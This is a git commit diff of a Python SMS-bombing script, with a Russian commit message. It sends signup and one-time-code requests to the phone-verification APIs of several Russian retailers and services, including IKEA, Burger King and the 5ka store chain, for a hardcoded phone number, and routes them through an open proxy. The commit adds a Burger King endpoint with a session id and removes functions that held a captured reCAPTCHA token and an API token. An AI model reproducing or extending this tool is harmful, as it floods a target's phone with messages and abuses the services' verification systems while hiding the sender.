1e3c13f67d155728d01645942ab53167b30ad833
Максим <yungmakcoc@gmail.com>
2021-08-08 02:17:43 +0500

    Добавил бургер кинг с токеном(мб откиснет=))

--- main.py
+++ main.py
@@ -1,13 +1,16 @@
 import requests
 import time
+import random
 
 
-# print("Введи номер телефона без кода страны")
-# phone=input()
-# print("Номер телефона " + phone)
+#print("Введи номер телефона без кода страны")
+#phone=input()
+
+
+#print("Номер телефона " + phone)
 phone = '9991253348'
 ts = 1
-ipPort = "3.213.139.74:8888"
+ipPort = "36.66.103.227:8080"
 proxy = {"https": "https://" + ipPort}
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
@@ -22,7 +25,7 @@ def pyaterka():
     p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone},
                       proxies=proxy)
     print(p.status_code)
-    print(p.json())
+    
 
 
 def karusel():
@@ -51,13 +54,6 @@ def aptekaru():
     #bisPhone="+7"+phone
     #bis=requests.post("https://bistrodengi.ru/ajax/lead.php",headers=bisHeaders,json={"fio":none,"phone":bisPhone})
 
-def mcdonalds():
-    mcHeaders=headers
-    mcHeaders.update({"host":"site-api.mcdonalds.ru", "Origin":"https://mcdonalds.ru"})
-    mcPhone="+7"+phone
-    mc=requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone",headers=mcHeaders, proxies=proxy,json={"number":"+79991253348","g-recaptcha-response":"03AGdBq25BqgSB9HzJmA1xZeGyo6I6_JpvzbC-a-wnYbYMRrech6-mXmImNqM6VfrpVMyFUuz1yykN2mzDXbqoz7uWlI0Y1L3AFaodQrnIjTS81mwaxWsfsohNFEdoDdIIYLW8INnBfh4h-f5u0GJN7M57xiGk_LjQqYV5s0Gi_lNBR_VxYUHleAKBFbRKZyn45UzsLU2L4hR5qpkp2Ai1UDxWugIBI4wUPO-AKU3n-5H-OZs_krT7ddVJ7rLnAvotMo10Z1TDQh-XyhY3GCeIl-Mr9c5lIctgb7VjVzcwh_ZXyJGy3kQgZ2QhORfe3VWlvzBgALSH6Wzf_v3LUXoL7pIf8ZFReMdu0m1d_-l5T0rrgZ5tK6bbMcBqa78hZ14U23oxLUviGVyLvxlrsZWqp1w4vL0oioHkJPGH3Z6dN-C8XBNi5RUxM3IV4t1Xqvci9lGB9DkRCL0-"})
-    print(mc.status_code,"McDonalds")
-    print(mc.json())
 
 def ikea():
     ikHeaders=headers
@@ -65,16 +61,15 @@ def ikea():
     ikPhone="+7" + phone
     ik=requests.post("https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start",headers=ikHeaders,proxies=proxy,json={"phoneNumber":ikPhone,"flow":"SIGNUP_PHONE_VERIFY"})
     print(ik.status_code,"Ikea")
+def burgerKing():
+    bkHeaders=headers
+    bkHeaders.update({"Host":"burgerking.ru","Origin":"https://burgerking.ru","x-burgerking-session-id":"875c2b20-f7c3-11eb-9546-41b04798b4e4"})
+    bkPhone="7" + phone
+    bk=requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup",headers=bkHeaders,proxies=proxy,json={"phone":bkPhone,"invite":""} )
+    print(bk.status_code,"Burger King")
 
-
-def getcontact():
-    getHeaders=headers
-    getPhone="+7"+phone
-    get=requests.post("https://widget.verifykit.com/v2.1/otp-start?token=dqad31cb9c92dbd66843a725867605fd6796922e9b894e514713ff845a144",headers=getHeaders,proxies=proxy,json={"countryCode":"RU","isMobileBrowser":"0","phoneNumber":getPhone})
-    print(get.status_code,"GetContact")
-
+burgerKing()
 ikea()
-getcontact()
 pyaterka()
 aptekaru()
 karusel()
